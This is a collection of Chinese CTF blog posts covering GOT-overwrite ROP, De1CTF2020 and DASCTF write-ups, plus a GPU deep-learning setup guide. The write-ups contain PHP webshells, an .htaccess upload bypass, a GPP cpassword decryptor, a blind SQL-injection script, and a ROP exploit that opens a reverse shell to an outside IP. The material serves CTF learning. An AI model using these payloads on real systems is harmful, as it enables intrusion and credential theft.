外部函数的内存地址存储在GOT而非PLT表内，PLT存储的入口点又指向GOT的对应条目，那么程序为什么选择PLT而非GOT作为调用的入口点呢？这样的设计是为了程序的运行效率。GOT表的初始值都指向PLT表对应条目中的某个片段，这个片段的作用是调用一个函数地址解析函数。当程序需要调用某个外部函数时，首先到PLT表内寻找对应的入口点，跳转到GOT表中。如果这是第一次调用这个函数，程序会通过GOT表再次跳转回PLT表，运行地址解析程序来确定函数的确切地址，并用其覆盖掉GOT表的初始值，之后再执行函数调用。当再次调用这个函数时，程序仍然首先通过PLT表跳转到GOT表，此时GOT表已经存有获取函数的内存地址，所以会直接跳转到函数所在地址执行函数。 第一次调用整个过程如下： 第二次调用整个过程如下： 上述实现遵循的是一种被称为LAZY的设计思想，它将需要完成的操作（解析外部函数的内存地址）留到调用实际发生时才进行，而非在程序一开始运行时就解析出全部函数地址。 这个过程也启示了我们如何实现函数的伪装，那就是到GOT表中将函数A的地址修改为函数B的地址。这样在后面所有对函数A的调用都会执行函数B。那么我们的目标可以分解为如下几部分：确定函数A在GOT表中的条目位置，确定函数B在内存中的地址，将函数B的地址写入函数A在GOT表中的条目。 1、如何确定函数A在GOT表中的条目位置？ 程序调用函数时是通过PLT表跳转到GOT表的对应条目，所以可以在函数调用的汇编指令中找到PLT表中该函数的入口点位置，从而定位到该函数在GOT中的条目。例如： call 0x08048430 &lt;printf@plt&gt; 就说明printf在PLT表中的入口点是在0x08048430，所以0x08048430处存储的就是GOT表中printf的条目地址。 2、如何确定函数B在内存中的地址？ 如果系统开启了内存布局随机化，程序每次运行动态链接库的加载位置都是随机的，就很难通过调试工具直接确定函数的地址。假如函数B在栈溢出之前已经被调用过，我们当然可以通过前一个问题的答案来获得地址。但我们心仪的攻击函数往往并不满足被调用过的要求，也就是GOT表中并没有其真实的内存地址。幸运的是，函数在动态链接库内的相对位置是固定的，在动态库打包生成时就已经确定。所以假如我们知道了函数A的运行时地址（读取 GOT 表内容），也知道函数A和函数B在动态链接库内的相对位置，就可以推算出函数B的运行时地址。 3、如何实现 GOT 表中数据的修改？ 很难找到合适的函数来完成这一任务，不过我们还有强大的ROP。假设我们可以找到以下若干条gadget，就不难改写GOT表中数据，从而实现函数的伪装。 pop eax; ret; # printf@plt -&gt; eaxmov ebx [eax]; ret; # printf@got -&gt; ebxpop ecx; ret; # addr_diff = system - printf -&gt; ecxadd [ebx] ecx; ret; # printf@got += addr_diff 从修改GOT表的过程可以看出，这种方法也可以在一定程度上绕过内存随机化。 四种常见的方法学习完毕，还得多动手实践才好，以上内容均参考长亭师傅们的文章，本文只是记录学习用。","link":"/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"title":"De1CTF2020部分题解","text":"这个比赛太考工作量，个人感觉知识量也比较大，另外De1ta的师傅们原来这么爱玩MC啊🤔，写一下几个题的题解，主要记录一下学到的东西。 check in考察上传绕过，一是在上传.htaccess时对关键字进行绕过，二是在传马时对&lt;?php进行绕过 解题打开题目，随便上传个php的小马，回显如下： php的后缀既然不行，那应该就是图片马了，八成是要用.htaccess解析，看一下响应头中服务器的架构：Apache/2.4.6 (CentOS) PHP/5.4.16，基本是确实是传.htaccess了 构造.htaccess将jpg进行解析： AddType application/x-httpd-php .jpg 上传之后回显如下： perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet 这些字段被ban了，不过.htaccess中可以用python换行时候一种解析语法： AddType application/x-httpd-p\\hp .jpg 上传的时候注意改Content-Type，如图： 如此便可以成功上传，然后传jpg的图片马就行了，注意图片马里的&lt;?php标签也需要绕过，可以用&lt;?=，如下图： 上传小马之后，拿到文件路径，传system(&quot;cat /flag&quot;);即可拿到flag。 Hard_present_1考察文件上传利用NTFS流绕过文件名检测、无字母数字shell构造、域渗透 题目分析进入题目，给出如下源码： &lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = \"uploads/\". md5(\"De1CTF2020\".$_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if($_POST[\"submit\"]){ if (($_FILES[\"file\"][\"size\"] &lt; 2048) &amp;&amp; Check()){ if ($_FILES[\"file\"][\"error\"] &gt; 0){ die($_FILES[\"file\"][\"error\"]); } else{ $filename=md5($_SERVER['REMOTE_ADDR']).\"_\".$_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $filename); echo \"save in:\" . $sandbox.\"/\" . $filename; } } else{ echo \"Not Allow!\"; }}function Check(){ $BlackExts = array(\"php\"); $ext = explode(\".\", $_FILES[\"file\"][\"name\"]); $exts = trim(end($ext)); $file_content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]); if(!preg_match('/[a-z0-9;~^`&amp;|]/is',$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match('/\\.\\./',$_FILES[\"file\"][\"name\"])) { return true; } return false;}?&gt; 审计一下发现文件名处有过滤，并且上传的文件中不能包含数字、小写字母、;、~、^、&amp;、|、反引号等，根据这个规则，肯定需要构造无数字字母的shell了，之前看过p神的一篇文章讲过，不过这里由于；也被过滤，需要用短标签来绕过。 BP抓包发现服务器是Windows server，这种情况下的文件上传可以利用NTFS的DATA特性进行绕过，参考这里用NTFS特性和无数字字母shell绕过限制上传，组策略泄露密码。 成功拿到shell之后，在服务器上找到了flag的压缩包，解压需要密码，这里考了一种域渗透，利用SYSVOL还原组策略中保存的密码，参考这篇文章。 解题思路很明确了：利用NTFS特性和无数字字母shell绕过限制上传，组策略泄露密码。 解题结合p神那篇文章里给出的shell构造方法，对其进行短标签拼接之后，shell脚本如下（由hpdoger师傅提供）： &lt;?=$_=[]?&gt;&lt;?=$_=@\"$_\"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$__=$_?&gt;&lt;?=$____='_'?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt; //S&lt;?=$___=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SY&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYS&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYST&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYSTE&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYSTEM&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_P&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_PO&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_POS&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_POST&lt;?=$_=$$____?&gt;&lt;?=$___($_[_])?&gt;//system($_POST[_]) //用的时候注释要去掉 需要注意一点：assert和eval在php7.2不属于函数，因此构造system。 利用NTFS的DATA特性绕过过滤上传小马，成功拿到shell： 利用这个shell，再传一个普通shell上去： _=echo ^&lt;?php eval($_POST[a]); &gt; ma.php 查看一下是否成功写入： 成功写入普通shell，蚁剑连接即可，在Hint目录下发现疑似flag的压缩包： 压缩包下载出来之后需要密码，终端net user /domain看到存在HintZip_Pass用户，显然，这个用户密码应该就是压缩包的密码了，下面就需要进行域渗透了。 终端net use获取到如下信息： 看到SYSVOL组策略的存在，读取其Groups.xml，内容如下： &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"HintZip_Pass\" image=\"2\" changed=\"2020-04-15 14:43:23\" uid=\"{D33537C1-0BDB-44B7-8628-A6030A298430}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08\" changeLogon=\"1\" noChange=\"0\" neverExpires=\"0\" acctDisabled=\"0\" userName=\"HintZip_Pass\"/&gt;&lt;/User&gt;&lt;/Groups&gt; 其中的cpassword=&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;就是该用户的密码，不过是经过AES加密的，参考域渗透那篇文章里的解密ps脚本： function Get-DecryptedCpassword { [CmdletBinding()] Param ( [string] $Cpassword ) try { #Append appropriate padding based on string length $Mod = ($Cpassword.length % 4) switch ($Mod) { '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)} '2' {$Cpassword += ('=' * (4 - $Mod))} '3' {$Cpassword += ('=' * (4 - $Mod))} } $Base64Decoded = [Convert]::FromBase64String($Cpassword) #Create a new AES .NET Crypto Object $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8, 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b) #Set IV to all nulls to prevent dynamic generation of IV value $AesIV = New-Object Byte[]($AesObject.IV.Length) $AesObject.IV = $AesIV $AesObject.Key = $AesKey $DecryptorObject = $AesObject.CreateDecryptor() [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length) return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock) } catch {Write-Error $Error[0]}} Get-DecryptedCpassword \"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08\" 或者到这里下载开源的解密脚本 用命令跑解密脚本powershell.exe -executionpolicy bypass -file get-DecryptedCpassword.ps1 成功拿到密码，解密即可拿到flag以及下一题的提示： flag1: De1CTF{GpP_11Is_SoOOO_Ea3333y}Get flag2 Hint:hint1: You need De1ta user to get flag2hint2: De1ta user's password length is 1-8, and the password is composed of [0-9a-f].hint3: Pay attention to the extended rights of De1ta user on the domain.hint4: flag2 in Domain Controller (C:\\Users\\Administrator\\Desktop\\flag.txt)PS: Please do not damage the environment after getting permission, thanks QAQ. 这道题学会了不少，Windows Server下的NTFS文件上传绕过、域渗透，在之前做过的题里很少见。 Hard_Pentest_2域渗透-利用资源约束委派进行提权 Mixture一道web+pwn题，这题是队里的大师傅们做的，我就摸鱼偷学点知识。 解题首先利用benchmark注出admin的密码，从师傅那里漂到脚本学习了一番： #coding:utf-8import requests#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'test'#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'string = ''session = requests.Session()headers= { \"Cookie\":\"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp\"}for i in range(1,100): for j in range(32,128): # print(j) url = \"http://134.175.185.244/member.php?orderby=,ISNULL(CASE WHEN (ascii(substr((select password from member where id=1),{0},1))={1}) THEN BENCHMARK(2000000,SHA1(123)) ELSE 2 END)\".format(i,j) r=session.get(url,headers = headers,cookies = cookies) # print(url) sec=r.elapsed.seconds if sec &gt; 3: string += chr(j) print(chr(j)) breakprint(string) 后面发现有个Mininclude，后面就是pwn的了，从大师傅那里拿到的源码，仔细读读，真的不会… #encoding:utf-8import requestsimport sysimport osfrom pwn import *from Crypto.Util.number import *s = requests.Session()headers= { \"Cookie\":\"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp\"}php_base = 0x7f546c3f7000libc_base = 0x7f546eacb000minclude_base = 0x7f546d84a000#filename = \"index.php\" #Here input filename you want to readINITIAL = 1526 - 9def main(): global INITIAL, php_base, minclude_base, libc_base if len(sys.argv) &lt; 2: print('usage: {} path'.format(sys.argv[0])) return exp = False debug = False filename = sys.argv[1] #Here input filename you want to read if filename == 'exp' or filename == 'debug': if filename == 'debug': debug = True php_base = 0x7f40b6ec3000 minclude_base = 0x7f40b6eba000 libc_base = 0x7f40b7fa0000 orig_ret = 0x7f546d151ac0 pop_rdi = php_base + 0x000000000014b260 # pop rdi ; ret php_info = 0x47bd10 - 0x100000 + php_base ret = php_base + 0x14b261 jmp_rdi = php_base + 0x000000000019f729 # jmp rdi if debug: mov_to_rdi = 0x00000000000494ea + libc_base # mov qword ptr [rdi], rsi ; ret else: mov_to_rdi = 0x00000000000494e5 + libc_base # mov eax, 1 ; mov qword ptr [rdi], rsi ; ret pop_pop = 0x000000000000135e + minclude_base # pop rbp ; pop r12 ; ret pop_rsi = 0x000000000002440e + libc_base # pop rsi ; ret exp = True system = libc_base + 0x449c0 halt = p64(pop_rdi) + p64(jmp_rdi) + p64(jmp_rdi) def write(addr, val): assert len(val) == 8 return p64(pop_rdi) + p64(addr) + p64(pop_rsi) + val + p64(mov_to_rdi) area = minclude_base + 0x4000 cmd = b\"php -r '$sock=fsockopen(\\\"118.178.180.118\\\",52333);exec(\\\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\\\");'\" cur = 0 rop = b'' buf = cmd[:8] rop += write(area, buf) cur += 8 buf = cmd[8:16] rop += write(area + 8, buf) cur += 8 rop += p64(pop_pop) rop += p64(0xdeadbeef) rop += p64(0xdeadbeef) while cur &lt; len(cmd): buf = cmd[cur: cur+8] if len(buf) != 8: buf = buf.ljust(8, b'\\0') rop += write(area + cur, buf) cur += 8 rop += p64(pop_rdi) rop += p64(area) rop += p64(system) rop += halt filename = b'a' * (0x88) + rop INITIAL += len(filename) if len(sys.argv) == 3: save_filename = sys.argv[2] else: save_filename = os.path.basename(filename) data = { \"search\":filename, \"submit\":\"submit\" } #url = \"http://134.175.185.244/select.php\" if debug: url = \"http://localhost:51111/select.php\" else: #url = \"http://49.51.251.99/select.php\" url = \"http://134.175.185.244/select.php\" r = requests.post(url, data=data, headers=headers) if not exp: f = open(save_filename, \"wb\") f.write(r.content[INITIAL:]) f.close() else: print(r.content)if __name__ == '__main__': main() 这题就先放一下把，需要慢慢消化。 Misc Chowder考察流量审计、压缩包密码爆破、NTFS流隐藏文件 知识扩展参考关于NTFS数据流及文件隐藏： NTFS交换数据流（alternate data streams，简称ADS）是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，就是说除了主文件流之外还可以有许多非主文件流寄宿在主文件流中。它使用资源派生来维持与文件相关的信息，虽然我们无法看到数据流文件，但是它却是真实存在于我们的系统中的。创建一个数据交换流文件的方法很简单，命令为“宿主文件：准备与宿主文件关联的数据流文件”。 利用这种数据流关联的方式，即可将一个文件的数据流关联到另一个文件上，这种方式下，目录下直接dir是看不到被关联的数据流的（当然被关联的原始文件肯定不在这个文件夹下），即实现了隐藏，不过dir /r可以将其列举出来。 解题拿到题目，是一个流量包，流量审计发现进行了多次upload，利用wireshark导出HTTP对象可以将上传的文件导出： 在导出HTTP对象时，可以看到有7次upload的动作，每一组包含两个可导出的对象upload_file.php，注意观察，两个对象里一个是multipart/form-data一个是text/html的，显然前者是包含上传文件的数据的，将其导出，导出之后直接打开发现是上传文件时候的包数据，而不是php代码： 而且显然，图片的数据就在其中，那就简单了，010editor将数据处理下，只保留图片数据，再改后缀就行了嘛 一个资源的url，访问可以下载到一个docx的压缩包，解压打开是这个样子… 考虑到之前有的docx文件会隐藏压缩包，拖到解压工具里看看，还真有 但是需要密码，到这一步，题目也给出Hint：压缩包密码暴破考点中，密码的长度为6位，前两位为DE那就掩码爆破呗，上ARCHPR，设置成掩码模式，开始跑~ 拿到密码~ 解压之后发现还是一张图，套娃了。。。 不过这个图拖到解压工具里又可以看到三个文件： flag.txt里的文件是假的，但是只要三个文件，图片中又提示I AM FLAG，试了其他办法也不行…后来了解到，可能是利用了NTFS数据流来隐藏flag了，Windows下列举解压出的目录试试： 果然存在隐藏的NTFS流，将fffffffflllll.txt的内容关联到了666.jpg里，这样，其实用notepad读取666.jpg:fffffffflllll.txt就可以了 成长路上，要学的还很多","link":"/2020/05/02/De1CTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/"},{"title":"深度学习环境配置","text":"之前一段时间，一直在用CPU跑算法训练自己的模型，今天突然意识到是支持GPU的啊，又快又省资源，不用它不是傻吗…🙄 下面记录一下如何配置TensorFlow-gpu + CUDA + Keras实现GPU训练深度学习算法的模型。 一些简介关于TensorFlow： TensorFlow 是一个端到端开源机器学习平台。它拥有一个全面而灵活的生态系统，其中包含各种工具、库和社区资源，可助力研究人员推动先进机器学习技术的发展，并使开发者能够轻松地构建和部署由机器学习提供支持的应用。 关于Keras： Keras是用Python编写的高级神经网络API，能够在TensorFlow，CNTK或Theano之上运行。它的开发着眼于实现快速实验。能够以最小的延迟将想法付诸实践是进行良好研究的关键。 允许轻松快速地进行原型制作（通过用户友好性，模块化和可扩展性）。 支持卷积网络和循环网络，以及两者的组合。 在CPU和GPU上无缝运行。 关于CUDA： CUDA(ComputeUnified Device Architecture)，是显卡厂商NVIDIA推出的运算平台。 CUDA是一种由NVIDIA推出的通用并行计算架构，该架构使GPU能够解决复杂的计算问题。 关于cuDNN： NVIDIA cuDNN是用于深度神经网络的GPU加速库。它强调性能、易用性和低内存开销。NVIDIA cuDNN可以集成到更高级别的机器学习框架中，如谷歌的Tensorflow、加州大学伯克利分校的流行caffe软件。简单的插入式设计可以让开发人员专注于设计和实现神经网络模型，而不是简单调整性能，同时还可以在GPU上实现高性能现代并行计算。 关于CUDA + cuDNN的组合： CUDA看作是一个工作台，上面配有很多工具，如锤子、螺丝刀等。cuDNN是基于CUDA的深度学习GPU加速库，有了它才能在GPU上完成深度学习的计算。它就相当于工作的工具，比如它就是个扳手。但是CUDA这个工作台买来的时候，并没有送扳手。想要在CUDA上运行深度神经网络，就要安装cuDNN，就像你想要拧个螺帽就要把扳手买回来。这样才能使GPU进行深度神经网络的工作，工作速度相较CPU快很多。 环境配置通过今天踩的坑，提醒近期如果需要用tensorflow+cuda实现GPU运算的话，最好安装tensorflow-gpu-2.0.0和duca-10.0，或者更低的版本，具体可以参考官网各版本对应的信息。 安装tensorflowpython下直接转tensorflow-gpu的库即可，哦！python3的版本一定要在3.7之下哦，还有一定要64bit的… python3 -m pip install tensorflow-gpu==2.0.0# 或者用国内镜像源加速安装python3 -m pip install tensorflow-gpu==2.0.0 -i https://pypi.tuna.tsinghua.edu.cn/simple 安装Keraspython直接装库 python3 -m pip install keras 安装配置DUCA这里装的tensorflow是2.0.0版本，因此duca需要10.0版本，可以去官网下载v10.0，选择exe(local)，可以直接完整化安装。 下载之后运行安装程序，如果不想麻烦直接默认简易安装即可，安装完毕之后可以测试一下，可能反馈如下信息： &gt;&gt;&gt; import tensorflow2020-04-07 16:00:12.823507: W tensorflow/stream_executor/platform/default/dso_loader.cc:55] Could not load dynamic library 'cudart64_100.dll'; dlerror: cudart64_101.dll not found 也就是说缺少了cudart64_100.dll这个动态链接库，可以去这里下载，下载完之后，将解压得到的文件放入C:\\Windows\\System32目录下，不过配置并未完成，因为cuDNN还未安装配置。 配置cuDNN官网下载与duca对应版本的cuDNN，不过首先需要注册、登录、完成一个小调查问卷，也不复杂的。 下载完毕之后，将压缩包里的内容放入CUDA安装的目录C:\\ProgramData\\NVIDIA Corporation\\CUDA Samples\\v10.0，如图： 同时需要将cudnn64_7.dll放入C:\\Windows\\System32下，不然可能仍然找不到该dll。 此时再去测试，应该就没问题了，可以用如下语句测试： &gt;&gt;&gt; a = tf.test.is_built_with_cuda() # 判断CUDA是否可以用&gt;&gt;&gt; b = tf.test.is_gpu_available(... cuda_only=False,... min_cuda_compute_capability=None... ) # 判断GPU是否可以用 成功配置的效果如下图： 反馈如上信息，则表明配置已经成功，再次跑算法就是GPU了，又快又拉风~ 问题及解决在自己配置的时候，远远没有上面说的这么简单，起初直接默认装了tensorflow，结果是最新版2.1.0的，查了一下，也就安装了cuda10.2的版本，结果报错找不到cudart64_100.dll，去上面提供的链接库的下载地址找到安装就行了，然而问题并没有那么简单，在配置好cuDNN之后，用前面的方法进行测试，一直报错： cudaGetDevice() failed. Status: cudaGetErrorString symbol not found. 这是什么问题呢？ 网上还有人说是NVIDIA驱动版本的问题，在控制面板看了一下，我的是441，已经满足要求了… 有人说tensorflow-2.1.0要和duca-10.1配合着用，结果还是很不OK…应该是新版本存在的问题，毕竟连tensorflow目前都并未支持python3的各个版本… 最后，姑且直接将tensorflow换成了tensorflow-2.0.0的版本，也就是前面安装步骤里讲到的，然后再配合安装duca-10.0进行配置，终于成功解决了问题。😎 希望这篇文章能够帮助到你","link":"/2020/05/01/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"},{"title":"安恒月赛DASCTF","text":"中午就睡了一会儿起来做题，还被室友给diss了…🙄，搞得下午一直恍恍惚惚… 也做了几道题，简单写下题解吧，师傅们勿捶。。。 web1考察反序列化逃逸，类似的题之前有写过：0CTF2019-piapiapia、春秋公益赛，这里不再详细解释。 解题进入题目给出源码： &lt;?phpshow_source(\"index.php\");function write($data) { return str_replace(chr(0) . '*' . chr(0), '\\0\\0\\0', $data);}function read($data) { return str_replace('\\0\\0\\0', chr(0) . '*' . chr(0), $data);}class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; }}class B{ public $b = 'gqy'; function __destruct(){ $c = 'a'.$this-&gt;b; echo $c; }}class C{ public $c; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return 'nice'; }}$a = new A($_GET['a'],$_GET['b']);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$b = unserialize(read(write(serialize($a)))); 根据字符替换的规则可以构造payload如下： a=\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&amp;b=a\";s:8:\"password\";O:1:\"B\":1:{s:1:\"b\";O:1:\"C\":1:{s:1:\"c\";s:8:\"flag.php\";}}} payload打过去之后看源码拿到flag。 cry1-not RSA这题考察Paillier加密算法，这题也是学到了新知识： Paillier加密系统，是1999年Paillier发明的概率公钥加密系统。基于复合剩余类的困难问题。该加密算法是一种同态加密，满足加法和数乘同态。 这篇博客有对该算法的讲解，这里我就不过多讲解了。 解题给出源码如下： ...m = long2bytes(flag)n = p * qr = random.randint(1,n)g = n + 1c = (pow(g,m,n*n))*pow(r,n,n*n))%n*n...# n=... c=... emmm… 其实做题的时候忘了把源码记下来了，就简单通过解密脚本逆了一下😅 通过密文c的产生明显看出来是Paillier算法进行加密的，既然如此，那么n应该是可以分解的，yafu分解了一下，果然可以。时间短，自己懒得写了解密脚本了，网上找了一个自己又改了一下： # paillier cryptosystemimport gmpy2import libnumdef L(x, n): return (x - 1) // ndef decipher(c, pk, sk): [n, g] = pk lmd = sk u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** 2), n), n) % n m = L(gmpy2.powmod(c, lmd, n ** 2), n) * u % n plaintext = libnum.n2s(m) return plaintextc = 29088911054711509252215615231015162998042579425917914434962376243477176757448053722602422672251758332052330100944900171067962180230120924963561223495629695702541446456981441239486190458125750543542379899722558637306740763104274377031599875275807723323394379557227060332005571272240560453811389162371812183549n = 6401013954612445818165507289870580041358569258817613282142852881965884799988941535910939664068503367303343695466899335792545332690862283029809823423608093g = n+1pk = [n,g]# p、q由yafu分解而来p = 80006336965345725157774618059504992841841040207998249416678435780577798937819q = 80006336965345725157774618059504992841841040207998249416678435780577798937447sk = (p-1) * (q-1)m = decipher(c, pk, sk)print(m) 再赠送一个整个加密、解密实现的代码： import gmpy2import randomimport timeimport libnumdef get_prime(rs): p = gmpy2.mpz_urandomb(rs, 1024) while not gmpy2.is_prime(p): p = p + 1 return pdef L(x, n): return (x - 1) / ndef keygen(): rs = gmpy2.random_state(int(time.time())) p = get_prime(rs) q = get_prime(rs) n = p * q lmd = (p - 1) * (q - 1) #g = random.randint(1, n ** 2) g = n + 1 if gmpy2.gcd(L(gmpy2.powmod(g, lmd, n ** 2), n), n) != 1: print('[!] g is not good enough') exit() pk = [n, g] sk = lmd return pk, skdef encipher(plaintext, pk): m = libnum.s2n(plaintext) n, g = pk r = random.randint(1, n ** 2) c = gmpy2.powmod(g, m, n ** 2) * gmpy2.powmod(r, n, n ** 2) % (n ** 2) return cdef decipher(c, pk, sk): [n, g] = pk lmd = sk u = gmpy2.invert(L(gmpy2.powmod(g, lmd, n ** 2), n), n) % n m = L(gmpy2.powmod(c, lmd, n ** 2), n) * u % n plaintext = libnum.n2s(m) return plaintextif __name__ == '__main__': pk, sk = keygen() plaintext = raw_input('Please input your message: ') ciphertext = encipher(plaintext, pk) print('Ciphertext:', ciphertext) plaintext = decipher(ciphertext, pk, sk) print('Plaintext:', plaintext) 还有几个misc的题，就不再写题解了，最近有点忙…","link":"/2020/04/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9BDSACTF/"},{"title":"虎符CTF两道web学习JS","text":"这次的虎符CTF没报上名也是可惜，不过朋友发来题目链接，打开一看是JS的题，还好没报名…😎 JS咱啥也不会呀，不过学习还是要学习的。 easy_login考察NodeJS代码审计、JS弱类型、JWT伪造 知识补充由于尚未专门学习JS，最近看到赛题就发怵，因为最近的比赛JS的题真是越来越多了😑，补充一些本题涉及的知识点先： 1、NodeJS的框架目录结构 dispatch.js 主进程文件 